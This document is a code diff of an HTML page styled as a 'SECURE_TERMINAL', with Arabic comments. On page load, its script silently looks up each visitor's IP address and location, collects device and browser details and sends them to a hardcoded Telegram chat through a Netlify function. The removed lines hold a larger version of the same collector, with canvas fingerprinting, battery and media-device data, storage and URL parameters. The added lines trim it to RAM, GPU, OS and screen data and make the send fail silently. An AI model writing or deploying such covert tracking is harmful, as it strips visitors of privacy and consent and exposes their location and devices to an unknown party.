@@ -1,11 +1,9 @@
-        <!DOCTYPE html>
-<html lang="ar">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SECURE_TERMINAL</title>
 <style>
-  /* نفس الستايلات السابقة */
   * {
     box-sizing: border-box;
   }
@@ -172,32 +170,6 @@
     padding: 14px;
     border-top: 1px solid #1f7a3f;
   }
-
-  .loading {
-    color: #4a8a63;
-    font-size: 0.8em;
-    margin-top: 10px;
-    display: none;
-  }
-
-  /* تحسينات للشاشات الصغيرة */
-  @media (max-width: 600px) {
-    .body-inner {
-      padding: 15px 20px;
-    }
-    .app-row {
-      flex-direction: column;
-      align-items: stretch;
-    }
-    .app-button {
-      margin-top: 10px;
-      text-align: center;
-    }
-    .titlebar {
-      flex-direction: column;
-      text-align: center;
-    }
-  }
 </style>
 </head>
 <body>
@@ -207,7 +179,7 @@
 <div class="container">
 
   <div class="titlebar">
-    <span>SECURE_TERMINAL v4.0</span>
+    <span>SECURE_TERMINAL </span>
     <span>SESSION: ACTIVE</span>
   </div>
 
@@ -274,7 +246,6 @@
     <hr class="divider">
 
     <p class="prompt-line">end of listing.</p>
-    <div class="loading" id="loadingStatus">جمع معلومات الجهاز...</div>
 
   </div>
 
@@ -291,482 +262,167 @@
 
 <script>
   // ============================================
-  // COLLECT ALL DEVICE INFORMATION
+  // جلب معلومات الرام والجهاز (المضافة الجديدة)
   // ============================================
   
-  async function getAllDeviceInfo() {
-    const info = {
-      timestamp: new Date().toISOString(),
-      timestamp_local: new Date().toLocaleString('ar-EG'),
-      system: {},
-      hardware: {},
-      network: {},
-      browser: {},
-      screen: {},
-      storage: {},
-      capabilities: {},
-      battery: {},
-      media: {},
-      security: {},
-      performance: {},
-      additional: {}
-    };
-
-    // ========== SYSTEM INFO ==========
-    info.system = {
-      platform: navigator.platform || "unknown",
-      userAgent: navigator.userAgent || "unknown",
-      appVersion: navigator.appVersion || "unknown",
-      vendor: navigator.vendor || "unknown",
-      product: navigator.product || "unknown",
-      language: navigator.language || "unknown",
-      languages: navigator.languages || [],
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
-      timezoneOffset: new Date().getTimezoneOffset(),
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack || "not specified",
-      hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
-      maxTouchPoints: navigator.maxTouchPoints || 0
-    };
-
-    // ========== HARDWARE INFO ==========
-    // RAM
-    if ('deviceMemory' in navigator) {
-      info.hardware.ram = navigator.deviceMemory + " GB";
-    } else {
-      info.hardware.ram = "غير متاح";
+  async function getRAMInfo() {
+    try {
+      let ramInfo = "غير متاح";
+      
+      // الطريقة الأولى: deviceMemory
+      if ('deviceMemory' in navigator) {
+        const gb = navigator.deviceMemory;
+        ramInfo = gb + " GB";
+      }
+      
+      // الطريقة الثانية: performance.memory (Chrome)
+      if (performance && performance.memory) {
+        const heapLimit = performance.memory.jsHeapSizeLimit;
+        const heapLimitGB = (heapLimit / 1024 / 1024 / 1024).toFixed(2);
+        ramInfo = ramInfo + " (JS Heap: " + heapLimitGB + " GB)";
+      }
+      
+      // الطريقة الثالثة: تقدير بناءً على عدد الأنوية
+      if (ramInfo === "غير متاح" || ramInfo.includes("غير متاح")) {
+        if (navigator.hardwareConcurrency) {
+          const cores = navigator.hardwareConcurrency;
+          let estimatedRAM = "";
+          if (cores <= 2) estimatedRAM = "4-8 GB (estimated)";
+          else if (cores <= 4) estimatedRAM = "8-16 GB (estimated)";
+          else if (cores <= 8) estimatedRAM = "16-32 GB (estimated)";
+          else estimatedRAM = "32+ GB (estimated)";
+          ramInfo = ramInfo + " (cores: " + cores + ", estimated: " + estimatedRAM + ")";
+        }
+      }
+      
+      return ramInfo;
+    } catch (e) {
+      return "غير متاح (خطأ في القراءة)";
     }
+  }
 
-    // CPU
-    info.hardware.cpuCores = navigator.hardwareConcurrency || "غير متاح";
-    info.hardware.cpuArchitecture = navigator.platform || "غير متاح";
-
-    // GPU
+  async function getDeviceInfo() {
+    const info = {};
+    
+    // معلومات المعالج
+    info.cpuCores = navigator.hardwareConcurrency || "غير متاح";
+    
+    // معلومات الرام
+    info.ram = await getRAMInfo();
+    
+    // معلومات GPU (إذا كانت متوفرة)
     try {
       const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const gl = canvas.getContext('webgl');
       if (gl) {
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
-          info.hardware.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-          info.hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-        } else {
-          info.hardware.gpu = "WEBGL_debug_renderer_info غير متاح";
+          info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
         }
-        info.hardware.webglVersion = gl instanceof WebGLRenderingContext ? "WebGL 1.0" : "WebGL 2.0";
-        info.hardware.webglVendor = gl.getParameter(gl.VENDOR);
-        info.hardware.webglRenderer = gl.getParameter(gl.RENDERER);
-      } else {
-        info.hardware.gpu = "WebGL غير مدعوم";
       }
-    } catch (e) {
-      info.hardware.gpu = "خطأ في قراءة GPU";
+    } catch(e) {
+      info.gpu = "غير متاح";
     }
-
-    // ========== NETWORK INFO ==========
-    if (navigator.connection) {
-      const conn = navigator.connection;
-      info.network = {
-        type: conn.effectiveType || "unknown",
-        downlink: conn.downlink ? conn.downlink + " Mbps" : "unknown",
-        rtt: conn.rtt ? conn.rtt + " ms" : "unknown",
-        downlinkMax: conn.downlinkMax ? conn.downlinkMax + " Mbps" : "unknown",
-        saveData: conn.saveData || false
-      };
-    } else {
-      info.network = {
-        type: "غير متاح",
-        downlink: "غير متاح",
-        rtt: "غير متاح"
-      };
-    }
-
-    // ========== BROWSER INFO ==========
-    info.browser = {
-      name: "Unknown",
-      version: "Unknown",
-      engine: "Unknown"
-    };
-
+    
+    // معلومات نظام التشغيل
     const ua = navigator.userAgent;
-    if (ua.includes("Edg/")) {
-      info.browser.name = "Edge";
-      info.browser.version = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || "unknown";
-    } else if (ua.includes("Chrome/") && !ua.includes("Chromium") && !ua.includes("Edg")) {
-      info.browser.name = "Chrome";
-      info.browser.version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || "unknown";
-    } else if (ua.includes("Firefox/")) {
-      info.browser.name = "Firefox";
-      info.browser.version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || "unknown";
-    } else if (ua.includes("Safari/") && !ua.includes("Chrome") && !ua.includes("Edg")) {
-      info.browser.name = "Safari";
-      info.browser.version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || "unknown";
-    } else if (ua.includes("Opera/") || ua.includes("OPR/")) {
-      info.browser.name = "Opera";
-      info.browser.version = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/)?.[1] || "unknown";
-    }
-
-    if (ua.includes("WebKit")) info.browser.engine = "WebKit";
-    else if (ua.includes("Gecko")) info.browser.engine = "Gecko";
-    else if (ua.includes("Trident")) info.browser.engine = "Trident";
-    else if (ua.includes("Blink")) info.browser.engine = "Blink";
-
-    info.browser.os = "Unknown";
-    if (ua.includes("Windows NT 10.0")) info.browser.os = "Windows 10/11";
-    else if (ua.includes("Windows NT 6.3")) info.browser.os = "Windows 8.1";
-    else if (ua.includes("Windows NT 6.2")) info.browser.os = "Windows 8";
-    else if (ua.includes("Windows NT 6.1")) info.browser.os = "Windows 7";
-    else if (ua.includes("Mac OS X")) info.browser.os = "macOS";
-    else if (ua.includes("Android")) info.browser.os = "Android";
-    else if (ua.includes("iPhone") || ua.includes("iPad")) info.browser.os = "iOS";
-    else if (ua.includes("Linux")) info.browser.os = "Linux";
-
-    info.browser.isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-    info.browser.isDesktop = !info.browser.isMobile;
-
-    // ========== SCREEN INFO ==========
-    info.screen = {
-      width: window.screen.width,
-      height: window.screen.height,
-      availWidth: window.screen.availWidth,
-      availHeight: window.screen.availHeight,
-      colorDepth: window.screen.colorDepth,
-      pixelRatio: window.devicePixelRatio || 1,
-      orientation: screen.orientation ? screen.orientation.type : "unknown",
-      orientationAngle: screen.orientation ? screen.orientation.angle : "unknown",
-      innerWidth: window.innerWidth,
-      innerHeight: window.innerHeight,
-      outerWidth: window.outerWidth,
-      outerHeight: window.outerHeight
-    };
-
-    // ========== STORAGE INFO ==========
-    try {
-      const storage = await navigator.storage.estimate();
-      info.storage = {
-        quota: storage.quota ? (storage.quota / 1024 / 1024 / 1024).toFixed(2) + " GB" : "غير متاح",
-        usage: storage.usage ? (storage.usage / 1024 / 1024).toFixed(2) + " MB" : "غير متاح",
-        percent: storage.usage && storage.quota ? 
-          ((storage.usage / storage.quota) * 100).toFixed(2) + "%" : "غير متاح",
-        localStorageSize: localStorage.length,
-        sessionStorageSize: sessionStorage.length
-      };
-    } catch(e) {
-      info.storage = { quota: "غير متاح", usage: "غير متاح", percent: "غير متاح" };
-    }
-
-    // ========== CAPABILITIES ==========
-    info.capabilities = {
-      webgl: !!document.createElement('canvas').getContext('webgl'),
-      webgl2: !!document.createElement('canvas').getContext('webgl2'),
-      webassembly: typeof WebAssembly === 'object',
-      serviceWorker: 'serviceWorker' in navigator,
-      geolocation: 'geolocation' in navigator,
-      notifications: 'Notification' in window,
-      touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-      pointer: 'PointerEvent' in window,
-      webRTC: 'RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window,
-      webAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
-      canvas: 'HTMLCanvasElement' in window,
-      svg: 'SVGElement' in window,
-      webWorkers: 'Worker' in window,
-      sharedWorkers: 'SharedWorker' in window,
-      webSockets: 'WebSocket' in window,
-      webStorage: 'localStorage' in window && 'sessionStorage' in window,
-      indexedDB: 'indexedDB' in window
-    };
-
-    // ========== BATTERY INFO ==========
-    try {
-      if ('getBattery' in navigator) {
-        const battery = await navigator.getBattery();
-        info.battery = {
-          level: (battery.level * 100).toFixed(0) + "%",
-          charging: battery.charging,
-          chargingTime: battery.chargingTime === Infinity ? "Infinite" : battery.chargingTime + " seconds",
-          dischargingTime: battery.dischargingTime === Infinity ? "Infinite" : battery.dischargingTime + " seconds"
-        };
-      } else {
-        info.battery = { available: false };
-      }
-    } catch(e) {
-      info.battery = { available: false, error: "غير متاح" };
-    }
-
-    // ========== MEDIA DEVICES ==========
-    try {
-      if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        info.media = {
-          audioInput: devices.filter(d => d.kind === 'audioinput').length,
-          audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
-          videoInput: devices.filter(d => d.kind === 'videoinput').length,
-          total: devices.length,
-          devices: devices.map(d => ({
-            kind: d.kind,
-            label: d.label || "غير مسمى",
-            deviceId: d.deviceId.substring(0, 10) + "..."
-          }))
-        };
-      } else {
-        info.media = { available: false };
-      }
-    } catch(e) {
-      info.media = { available: false, error: "Permission denied or not available" };
-    }
-
-    // ========== SECURITY ==========
-    info.security = {
-      https: window.location.protocol === 'https:',
-      referrerPolicy: document.referrerPolicy || "unknown",
-      csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? true : false,
-      inIframe: window !== window.top
-    };
-
-    try {
-      info.security.sameOrigin = window.origin === window.top.location.origin;
-    } catch(e) {
-      info.security.sameOrigin = false;
-    }
-
-    // ========== PERFORMANCE ==========
-    if (performance.timing) {
-      info.performance = {
-        navigationStart: performance.timing.navigationStart,
-        domComplete: performance.timing.domComplete,
-        loadEventEnd: performance.timing.loadEventEnd,
-        memory: {}
-      };
-    }
-
-    // Memory info (Chrome only)
-    if (performance.memory) {
-      info.performance.memory = {
-        totalJSHeapSize: (performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(2) + " MB",
-        usedJSHeapSize: (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2) + " MB",
-        jsHeapSizeLimit: (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(2) + " MB"
-      };
-    }
-
-    // ========== ADDITIONAL INFO ==========
-    info.additional = {
-      referrer: document.referrer || "direct",
-      pageURL: window.location.href,
-      pagePath: window.location.pathname,
-      searchParams: window.location.search || "none",
-      hostname: window.location.hostname,
-      protocol: window.location.protocol,
-      port: window.location.port || "default",
-      hash: window.location.hash || "none"
-    };
-
-    // ========== FINGERPRINT ==========
-    info.fingerprint = {
-      timezone: info.system.timezone,
-      screenResolution: info.screen.width + "x" + info.screen.height,
-      colorDepth: info.screen.colorDepth,
-      pixelRatio: info.screen.pixelRatio,
-      platform: info.system.platform,
-      userAgent: info.system.userAgent,
-      language: info.system.language
-    };
-
-    // Canvas fingerprint
-    try {
-      const canvas = document.createElement('canvas');
-      canvas.width = 200;
-      canvas.height = 50;
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = "top";
-      ctx.font = "14px Arial";
-      ctx.fillStyle = "#f60";
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = "#069";
-      ctx.fillText("Hello, world!", 2, 15);
-      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-      ctx.fillText("Hello, world!", 4, 17);
-      info.fingerprint.canvas = canvas.toDataURL().substring(0, 100) + "...";
-    } catch(e) {
-      info.fingerprint.canvas = "غير متاح";
-    }
-
+    let os = "Unknown";
+    if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
+    else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
+    else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
+    else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
+    else if (ua.includes("Mac OS X")) os = "macOS";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+    else if (ua.includes("Linux")) os = "Linux";
+    info.os = os;
+    
+    // دقة الشاشة
+    info.screen = window.screen.width + "x" + window.screen.height;
+    info.pixelRatio = window.devicePixelRatio;
+    
     return info;
   }
 
   // ============================================
-  // FORMAT MESSAGE FOR TELEGRAM
+  // إرسال الإشعار مع المعلومات الإضافية
   // ============================================
   
-  function formatTelegramMessage(info, ip, location) {
-    let message = "🔐 **NEW VISITOR DETECTED**\n";
-    message += "━━━━━━━━━━━━━━━━━━━━\n\n";
-    
-    message += "📅 **TIME**\n";
-    message += `  ${info.timestamp_local}\n\n`;
-    
-    message += "🌍 **LOCATION**\n";
-    message += `  IP: ${ip || 'غير معروف'}\n`;
-    message += `  Location: ${location || 'غير معروف'}\n\n`;
-    
-    message += "💻 **SYSTEM**\n";
-    message += `  OS: ${info.browser.os}\n`;
-    message += `  Platform: ${info.system.platform}\n`;
-    message += `  CPU Cores: ${info.hardware.cpuCores}\n`;
-    message += `  RAM: ${info.hardware.ram}\n`;
-    if (info.hardware.gpu) {
-      message += `  GPU: ${info.hardware.gpu.substring(0, 50)}...\n`;
-    }
-    message += "\n";
-    
-    message += "🌐 **BROWSER**\n";
-    message += `  Name: ${info.browser.name} ${info.browser.version}\n`;
-    message += `  Engine: ${info.browser.engine}\n`;
-    message += `  Language: ${info.system.language}\n`;
-    message += `  Languages: ${info.system.languages.join(', ')}\n`;
-    message += `  User Agent: ${info.system.userAgent.substring(0, 100)}...\n\n`;
-    
-    message += "📱 **SCREEN**\n";
-    message += `  Resolution: ${info.screen.width}x${info.screen.height}\n`;
-    message += `  Available: ${info.screen.availWidth}x${info.screen.availHeight}\n`;
-    message += `  Color Depth: ${info.screen.colorDepth}-bit\n`;
-    message += `  Pixel Ratio: ${info.screen.pixelRatio}x\n`;
-    message += `  Orientation: ${info.screen.orientation}\n\n`;
-    
-    message += "📶 **NETWORK**\n";
-    message += `  Type: ${info.network.type || 'غير متاح'}\n`;
-    message += `  Speed: ${info.network.downlink || 'غير متاح'}\n`;
-    message += `  Latency: ${info.network.rtt || 'غير متاح'}\n\n`;
-    
-    message += "🔋 **BATTERY**\n";
-    if (info.battery.level) {
-      message += `  Level: ${info.battery.level}\n`;
-      message += `  Charging: ${info.battery.charging ? '✅ Yes' : '❌ No'}\n`;
-    } else {
-      message += `  Not available\n`;
-    }
-    message += "\n";
-    
-    message += "💾 **STORAGE**\n";
-    message += `  Total: ${info.storage.quota || 'غير متاح'}\n`;
-    message += `  Used: ${info.storage.usage || 'غير متاح'}\n`;
-    message += `  Usage: ${info.storage.percent || 'غير متاح'}\n`;
-    message += `  LocalStorage Items: ${info.storage.localStorageSize || 0}\n\n`;
-    
-    message += "🎮 **CAPABILITIES**\n";
-    message += `  WebGL: ${info.capabilities.webgl ? '✅' : '❌'}\n`;
-    message += `  WebGL2: ${info.capabilities.webgl2 ? '✅' : '❌'}\n`;
-    message += `  WebAssembly: ${info.capabilities.webassembly ? '✅' : '❌'}\n`;
-    message += `  WebRTC: ${info.capabilities.webRTC ? '✅' : '❌'}\n`;
-    message += `  Touch: ${info.capabilities.touch ? '✅' : '❌'}\n`;
-    message += `  Service Worker: ${info.capabilities.serviceWorker ? '✅' : '❌'}\n`;
-    message += `  Geolocation: ${info.capabilities.geolocation ? '✅' : '❌'}\n`;
-    message += `  Notifications: ${info.capabilities.notifications ? '✅' : '❌'}\n\n`;
-    
-    message += "🎥 **MEDIA DEVICES**\n";
-    message += `  Audio Input: ${info.media.audioInput || 0}\n`;
-    message += `  Audio Output: ${info.media.audioOutput || 0}\n`;
-    message += `  Video Input: ${info.media.videoInput || 0}\n`;
-    message += `  Total: ${info.media.total || 0}\n\n`;
-    
-    message += "🔒 **SECURITY**\n";
-    message += `  HTTPS: ${info.security.https ? '✅' : '❌'}\n`;
-    message += `  In Iframe: ${info.security.inIframe ? '✅' : '❌'}\n`;
-    message += `  Same Origin: ${info.security.sameOrigin ? '✅' : '❌'}\n\n`;
-    
-    message += "⏱️ **PERFORMANCE**\n";
-    if (info.performance && info.performance.memory && info.performance.memory.totalJSHeapSize) {
-      message += `  JS Heap Total: ${info.performance.memory.totalJSHeapSize}\n`;
-      message += `  JS Heap Used: ${info.performance.memory.usedJSHeapSize}\n`;
-      message += `  JS Heap Limit: ${info.performance.memory.jsHeapSizeLimit}\n\n`;
-    }
-    
-    message += "🆔 **FINGERPRINT**\n";
-    message += `  Timezone: ${info.fingerprint.timezone}\n`;
-    message += `  Resolution: ${info.fingerprint.screenResolution}\n`;
-    if (info.fingerprint.canvas) {
-      message += `  Canvas: ${info.fingerprint.canvas.substring(0, 50)}...\n\n`;
-    }
-    
-    message += "📌 **ADDITIONAL**\n";
-    message += `  Referrer: ${info.additional.referrer}\n`;
-    message += `  Page: ${info.additional.pagePath}\n`;
-    message += `  Hostname: ${info.additional.hostname}\n`;
-    message += `  Protocol: ${info.additional.protocol}\n`;
-    message += `  Search Params: ${info.additional.searchParams}\n`;
-    
-    return message;
-  }
+  const TELEGRAM_CHAT_ID = "8484620043";
 
-  // ============================================
-  // SEND TO TELEGRAM VIA NETLIFY FUNCTION
-  // ============================================
-  
   async function notifyVisit() {
-    const loadingEl = document.getElementById('loadingStatus');
-    if (loadingEl) loadingEl.style.display = 'block';
-
+    let ip = "unknown";
+    let location = "unknown";
     try {
-      // 1. Get location
-      let ip = "unknown";
-      let location = "unknown";
-      try {
-        const geoRes = await fetch("https://ipapi.co/json/");
-        const geoData = await geoRes.json();
-        ip = geoData.ip || "unknown";
-        const city = geoData.city || "";
-        const region = geoData.region || "";
-        const country = geoData.country_name || "";
-        location = [city, region, country].filter(Boolean).join(", ") || "unknown";
-      } catch (e) {
-        console.log('Could not get location:', e);
-      }
-
-      // 2. Get all device info
-      const deviceInfo = await getAllDeviceInfo();
-
-      // 3. Format message
-      const message = formatTelegramMessage(deviceInfo, ip, location);
-
-      // 4. Send to Netlify Function (الـ Function راح ياخذ التوكن من متغيرات البيئة)
-      const response = await fetch("/.netlify/functions/telegram", {
-        method: "POST",
-        headers: { 
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "8484620043",
-          text: message
-        })
-      });
-
-      const result = await response.json();
-
-      if (response.ok) {
-        if (loadingEl) {
-          loadingEl.textContent = '✅ تم إرسال الإشعار بنجاح';
-          loadingEl.style.color = '#4dff88';
-        }
-        console.log('✅ Notification sent successfully');
-      } else {
-        throw new Error(result.error || 'Failed to send');
-      }
-
-    } catch (error) {
-      console.error('Error sending notification:', error);
-      if (loadingEl) {
-        loadingEl.textContent = '❌ فشل في إرسال الإشعار';
-        loadingEl.style.color = '#ff6b6b';
-      }
+      const geoRes = await fetch("https://ipapi.co/json/");
+      const geoData = await geoRes.json();
+      ip = geoData.ip || "unknown";
+      const city = geoData.city || "";
+      const country = geoData.country_name || "";
+      location = [city, country].filter(Boolean).join(", ") || "unknown";
+    } catch (e) {
+      // ignore
     }
+
+    // جلب معلومات الجهاز الإضافية
+    const deviceInfo = await getDeviceInfo();
+
+    // معلومات المتصفح
+    const ua = navigator.userAgent;
+    let browser = "Unknown";
+    if (ua.includes("Edg/")) browser = "Edge";
+    else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
+    else if (ua.includes("Firefox/")) browser = "Firefox";
+    else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
+
+    let os = "Unknown";
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Mac OS")) os = "macOS";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+    else if (ua.includes("Linux")) os = "Linux";
+
+    const screenSize = window.screen.width + "x" + window.screen.height;
+    const language = navigator.language || "unknown";
+
+    // إنشاء الرسالة مع المعلومات الإضافية
+    const message =
+      "🔐 New visitor on SECURE_TERM\n" +
+      "━━━━━━━━━━━━━━━━━━━━\n\n" +
+      "📅 Time: " + new Date().toLocaleString() + "\n" +
+      "🌍 IP: " + ip + "\n" +
+      "📍 Location: " + location + "\n\n" +
+      "💻 System Info:\n" +
+      "  OS: " + deviceInfo.os + "\n" +
+      "  CPU Cores: " + deviceInfo.cpuCores + "\n" +
+      "  RAM: " + deviceInfo.ram + "\n" +
+      "  GPU: " + (deviceInfo.gpu || "غير متاح") + "\n\n" +
+      "🌐 Browser:\n" +
+      "  Name: " + browser + "\n" +
+      "  OS: " + os + "\n" +
+      "  Screen: " + screenSize + "\n" +
+      "  Pixel Ratio: " + deviceInfo.pixelRatio + "x\n" +
+      "  Language: " + language + "\n\n" +
+      "📌 Referrer: " + (document.referrer || "direct");
+
+    // إرسال إلى تلغرام (نفس الطريقة القديمة)
+    fetch("/.netlify/functions/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    }).catch(() => {
+      // fail silently
+    });
   }
 
-  // Execute when page loads
-  window.addEventListener('load', () => {
-    notifyVisit();
-  });
+  // تشغيل الإشعار
+  notifyVisit();
 
   // ============================================
-  // BASIC SECURITY MEASURES
+  // الإعدادات الأمنية (نفس القديمة)
   // ============================================
   
   document.addEventListener('contextmenu', function (e) {
@@ -784,8 +440,8 @@
     }
   });
 
-  console.log('%c⚠️ SECURITY NOTICE', 'color:red; font-size:20px; font-weight:bold;');
-  console.log('This terminal is monitored. All actions are logged.');
+  console.log('%cStop!', 'color:red; font-size:30px; font-weight:bold;');
+  console.log('This is a browser feature intended for developers. Pasting or running code here you don\'t understand could compromise your account or device.');
 </script>
 
 </body>
